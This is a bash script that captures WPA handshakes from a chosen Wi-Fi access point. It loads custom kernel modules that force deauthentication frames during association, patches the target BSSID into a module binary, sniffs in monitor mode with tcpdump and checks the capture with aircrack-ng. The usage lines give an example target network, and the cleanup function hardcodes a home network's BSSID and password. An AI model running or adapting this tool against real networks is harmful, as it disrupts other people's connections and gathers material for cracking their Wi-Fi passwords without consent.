#!/bin/bash
# grab_hs5.sh - Handshake capture with pe_find_session_by_bssid deauth
# Usage: grab_hs5.sh <BSSID> <SSID|auto> [CHANNEL] [ROUNDS]
# Example: grab_hs5.sh 8C:F0:DF:1F:4F:C7 Flymodem2631 7 5
# Example: grab_hs5.sh 8C:F0:DF:1F:4F:C7 auto

set -o pipefail

BSSID="${1:?Usage: $0 <BSSID> <SSID|auto> [CHANNEL] [ROUNDS]}"
SSID_ARG="${2:-auto}"
CH="${3:-0}"
ROUNDS="${4:-5}"
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PSK="9006609b29404a"

ch2freq() {
    case "$1" in
        1) echo 2412;; 2) echo 2417;; 3) echo 2422;; 4) echo 2427;;
        5) echo 2432;; 6) echo 2437;; 7) echo 2442;; 8) echo 2447;;
        9) echo 2452;; 10) echo 2457;; 11) echo 2462;; 12) echo 2467;; 13) echo 2472;;
        36) echo 5180;; 40) echo 5200;; 44) echo 5220;; 48) echo 5240;;
        52) echo 5260;; 149) echo 5745;; 153) echo 5765;; 157) echo 5785;;
        *) echo $((2407 + $1 * 5));;
    esac
}

cleanup() {
    killall wpa_supplicant tcpdump 2>/dev/null
    echo "[*] Restoring home WiFi..."
    rmmod wlan 2>/dev/null; sleep 2
    insmod "$DRIVER" 2>/dev/null; sleep 4
    systemctl start NetworkManager 2>/dev/null; sleep 2
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    echo "[*] Restored."
}
trap cleanup EXIT

cd /tmp
[ -f petx8.ko ] || { as -o petx8.o petx8.S && ld -r -o petx8.ko petx8.o; }
[ -f petx5.ko ] || { as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o; }

# Auto-detect SSID and channel
if [ "$SSID_ARG" = "auto" ] || [ "$CH" = "0" ]; then
    echo "[*] Scanning for $BSSID..."
    systemctl stop NetworkManager 2>/dev/null
    killall wpa_supplicant 2>/dev/null
    rmmod wlan 2>/dev/null; sleep 2
    insmod "$DRIVER" 2>/dev/null; sleep 4
    ip link set wlan0 up 2>/dev/null
    SCAN=$(iw dev wlan0 scan 2>/dev/null)
    BSSID_LOWER=$(echo "$BSSID" | tr 'A-F' 'a-f')
    BLOCK=$(echo "$SCAN" | sed -n "/BSS ${BSSID_LOWER}/,/^BSS /p" | head -20)
    if [ "$SSID_ARG" = "auto" ]; then
        SSID=$(echo "$BLOCK" | grep "SSID:" | head -1 | sed 's/.*SSID: //')
        [ -z "$SSID" ] && { echo "[!] Could not find SSID for $BSSID"; exit 1; }
    else
        SSID="$SSID_ARG"
    fi
    if [ "$CH" = "0" ]; then
        CH=$(echo "$BLOCK" | grep "DS Parameter" | head -1 | sed 's/.*channel //')
        [ -z "$CH" ] && { echo "[!] Could not find channel for $BSSID"; exit 1; }
    fi
fi

FREQ=$(ch2freq "$CH")
echo "[*] Target: $SSID ($BSSID) ch$CH ($FREQ MHz)"
echo "[*] Rounds: $ROUNDS"

# Patch petx8 BSSID
BSSID_HEX=$(echo "$BSSID" | tr -d ':' | tr 'A-F' 'a-f')
python3 -c "
bssid = bytes.fromhex('$BSSID_HEX')
with open('/tmp/petx8.ko', 'rb') as f:
    data = bytearray(f.read())
default = bytes.fromhex('8cf0df1f4fc7')
idx = data.find(default)
if idx >= 0:
    data[idx:idx+6] = bssid
    with open('/tmp/petx8.ko', 'wb') as f:
        f.write(data)
    print(f'Patched BSSID at offset {idx}')
else:
    print('BSSID already patched or default')
" 2>&1

cat > /tmp/wpa_target.conf << WPAEOF
ctrl_interface=/tmp/wpa_ctrl
network={
    ssid="$SSID"
    bssid=$BSSID
    psk="dummypassword1234567890123456"
    key_mgmt=WPA-PSK
    scan_freq=$FREQ
}
WPAEOF

rm -f /tmp/hs_grab*.pcap
HANDSHAKE_FOUND=0

for round in $(seq 1 "$ROUNDS"); do
    echo ""
    echo "========== ROUND $round/$ROUNDS =========="

    # PHASE 1: STA mode + deauth
    echo "[Phase 1] Connect to target + deauth"
    killall wpa_supplicant tcpdump 2>/dev/null
    systemctl stop NetworkManager 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 2

    insmod "$DRIVER"
    sleep 4
    ip link set wlan0 up

    rm -rf /tmp/wpa_ctrl; mkdir -p /tmp/wpa_ctrl
    wpa_supplicant -i wlan0 -c /tmp/wpa_target.conf -B -D nl80211 2>/dev/null

    # Fire petx8+petx5 in tight loop during association window
    DEAUTH_OK=0
    DMESG_BEFORE=$(dmesg | wc -l)
    for attempt in $(seq 1 40); do
        rmmod kfind 2>/dev/null
        insmod /tmp/petx8.ko 2>/dev/null
        NEW_DEAUTH=$(dmesg | tail -$(($(dmesg | wc -l) - DMESG_BEFORE)) | grep -c "calling lim_send")
        if [ "$NEW_DEAUTH" -gt 0 ]; then
            DEAUTH_OK=$((DEAUTH_OK + NEW_DEAUTH))
            echo "[+] petx8 DEAUTH at attempt $attempt!"
            for extra in 1 2 3 4 5; do
                rmmod kfind 2>/dev/null
                insmod /tmp/petx8.ko 2>/dev/null
                dmesg | tail -3 | grep -q "calling lim_send" && DEAUTH_OK=$((DEAUTH_OK + 1))
            done
            break
        fi
        rmmod kfind 2>/dev/null
        insmod /tmp/petx5.ko 2>/dev/null
        NEW_DEAUTH=$(dmesg | tail -$(($(dmesg | wc -l) - DMESG_BEFORE)) | grep -c "calling lim_send")
        if [ "$NEW_DEAUTH" -gt "$DEAUTH_OK" ]; then
            DEAUTH_OK=$NEW_DEAUTH
            echo "[+] petx5 DEAUTH at attempt $attempt!"
            for extra in 1 2 3 4 5; do
                rmmod kfind 2>/dev/null
                insmod /tmp/petx5.ko 2>/dev/null
                dmesg | tail -3 | grep -q "calling lim_send" && DEAUTH_OK=$((DEAUTH_OK + 1))
            done
            break
        fi
    done
    echo "[*] Deauths sent: $DEAUTH_OK"

    # PHASE 2: Monitor mode capture
    echo "[Phase 2] Monitor mode capture"
    killall wpa_supplicant 2>/dev/null
    rmmod kfind 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 2

    insmod "$DRIVER" con_mode_monitor=4
    sleep 3
    ip link set wlan0 up 2>/dev/null
    iw dev wlan0 set freq "$FREQ" 2>/dev/null
    echo "[+] Capturing ch$CH for 30s..."

    timeout 30 tcpdump -i wlan0 -w "/tmp/hs_grab${round}.pcap" 2>/dev/null
    FSIZE=$(stat -c%s "/tmp/hs_grab${round}.pcap" 2>/dev/null || echo 0)
    echo "[+] Captured: $FSIZE bytes"

    # Check EAPOL - look for ethertype 0x888e in raw bytes
    EAPOL=$(tcpdump -r "/tmp/hs_grab${round}.pcap" -e -x 2>/dev/null | grep -c "888e")
    echo "[*] EAPOL frames: $EAPOL"

    if [ "$EAPOL" -gt 0 ]; then
        echo "[!!!] EAPOL FOUND!"
        timeout 10 aircrack-ng "/tmp/hs_grab${round}.pcap" 2>&1 | head -15
        HS=$(timeout 10 aircrack-ng "/tmp/hs_grab${round}.pcap" 2>&1 | grep -c "1 handshake")
        if [ "$HS" -gt 0 ]; then
            echo "[!!!] HANDSHAKE CAPTURED!"
            cp "/tmp/hs_grab${round}.pcap" /tmp/handshake_result.pcap
            HANDSHAKE_FOUND=1
            break
        fi
    fi
done

echo ""
if [ "$HANDSHAKE_FOUND" -eq 1 ]; then
    echo "========================================"
    echo "[SUCCESS] Handshake: /tmp/handshake_result.pcap"
    echo "========================================"
else
    echo "[*] No complete handshake in $ROUNDS rounds"
    ls -la /tmp/hs_grab*.pcap 2>/dev/null
fi
